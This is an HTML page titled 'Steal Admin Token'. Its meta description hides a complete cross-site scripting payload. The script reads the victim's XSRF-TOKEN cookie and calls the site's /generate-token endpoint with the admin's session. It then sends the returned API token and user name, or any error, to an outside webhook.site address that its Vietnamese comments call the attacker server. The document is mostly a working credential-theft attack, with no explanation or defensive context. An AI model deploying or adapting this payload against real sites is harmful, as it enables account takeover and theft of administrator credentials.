<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Steal Admin Token</title>
  <meta name="description" content='<script>
    (async function () {
      const webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";

      // Lấy XSRF token từ cookie
      let xsrf = null;
      document.cookie.split(";").forEach(c => {
        c = c.trim();
        if (c.startsWith("XSRF-TOKEN=")) {
          xsrf = decodeURIComponent(c.substring("XSRF-TOKEN=".length));
        }
      });

      if (!xsrf) return;

      try {
        const res = await fetch("/generate-token", {
          method: "POST",
          headers: {
            "Accept": "application/json",
            "X-XSRF-TOKEN": xsrf,
            "X-Requested-With": "XMLHttpRequest"
          },
          credentials: "include" // Gửi cookie admin
        });

        const data = await res.json();

        if (data.token) {
          // Gửi token về attacker server
          const img = new Image();
          img.src = `${webhook}?token=${encodeURIComponent(data.token)}&name=${encodeURIComponent(data.user?.name || "unknown")}`;
        }
      } catch (e) {
        // Gửi lỗi nếu cần
        const img = new Image();
        img.src = `${webhook}?error=${encodeURIComponent(e.toString())}`;
      }
    })();
  </script>'>
</head>
<body>
  <h1>Token Stealing Page</h1>
</body>
</html>
